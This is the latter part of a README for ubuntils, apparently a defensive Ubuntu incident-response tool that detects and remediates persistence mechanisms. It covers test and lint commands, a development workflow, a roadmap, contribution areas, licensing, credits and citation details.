# Run all tests
pytest tests/

# With coverage
pytest --cov=ubuntils tests/

# Specific test file
pytest tests/test_collectors.py -v

# Test with output
pytest tests/ -s
```

### Code Style

```bash
# Lint code
flake8 ubuntils/

# Format code
black ubuntils/

# Type checking (optional)
mypy ubuntils/
```

### Development Workflow

1. Create feature branch: `git checkout -b feature/your-feature`
2. Make changes, write tests
3. Run tests: `pytest tests/`
4. Lint: `flake8 ubuntils/`
5. Commit: `git commit -m "Add feature description"`
6. Push: `git push origin feature/your-feature`
7. Open Pull Request on GitHub

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

### Architecture Reference

See [claude.md](claude.md) for comprehensive development documentation including:
- Detailed architecture
- Module responsibilities
- Code patterns + conventions
- Testing strategies
- Persistence rule implementations

---

## Roadmap

### Phase 1: Core Detection + Remediation (Summer 2024)
- [x] Artifact collection (processes, logs, filesystem)
- [x] 8 persistence detection rules
- [x] Timeline building
- [x] Safe remediation with backups
- [x] Human-readable + JSON output
- [x] 80%+ test coverage
- [x] Comprehensive documentation

### Phase 2: Enrichment (v1.5, Post-Summer)
- [ ] VirusTotal API integration
- [ ] MISP integration
- [ ] Custom rule engine
- [ ] False positive tuning
- [ ] Performance optimization

### Phase 3: UI + Integration (v2.0, Future)
- [ ] Web dashboard
- [ ] Wazuh integration
- [ ] Slack alerts
- [ ] SOAR automation
- [ ] macOS support

### Phase 4: Advanced Features (v2.5+, Long-Term)
- [ ] Memory forensics
- [ ] Disk forensics
- [ ] Network forensics
- [ ] Threat intelligence feeds
- [ ] Automated response

---

## Contributing

Contributions are welcome! Areas where help is needed:

- **Detection rules** — New persistence mechanisms
- **Collectors** — Additional artifact sources
- **Remediators** — New auto-fix capabilities
- **Testing** — Test cases on different Ubuntu versions
- **Documentation** — Usage guides, examples, tutorials
- **Performance** — Optimization + benchmarking
- **Integrations** — SIEM, SOAR, threat intelligence

See [CONTRIBUTING.md](CONTRIBUTING.md) for:
- Development setup
- Code style guidelines
- Pull request process
- Testing requirements
- Commit message format

---

## License

MIT License. See [LICENSE](LICENSE) file for details.

---

## Author

Built by **Asmit** - BTech CS, PES University, Bengaluru

Inspired by incident response workflows in real-world SOC environments. Designed for incident responders, security engineers, and threat hunters.

---

## Acknowledgments

- **Detection rules:** MITRE ATT&CK framework
- **Inspiration:** SecPod incident response stack
- **Testing methodology:** Ubuntu security best practices
- **Community feedback:** Security researchers + incident responders

---

## Support

Found a bug? Have a feature request? Want to contribute?

- **Issues:** [github.com/asmitdesai/ubuntils/issues](https://github.com/asmitdesai/ubuntils/issues)
- **Discussions:** [github.com/asmitdesai/ubuntils/discussions](https://github.com/asmitdesai/ubuntils/discussions)
- **Email:** (Add if applicable)
- **Security Issues:** Please report privately via GitHub Security Advisory

---

## Citation

If you use ubuntils in your research or write about it, please cite:

```bibtex
@software{ubuntils2024,
  author = {Asmit},
  title = {ubuntils: Ubuntu Incident Response Forensics Tool},
  year = {2024},
  url = {https://github.com/asmitdesai/ubuntils}
}
```

---

**ubuntils: Automate Ubuntu incident response. Ship faster. Remediate smarter.**

For incident responders, by incident responders.

---

*Latest Release:* v0.1.0-beta  
*Status:* Active Development  
*Last Updated:* June 2024
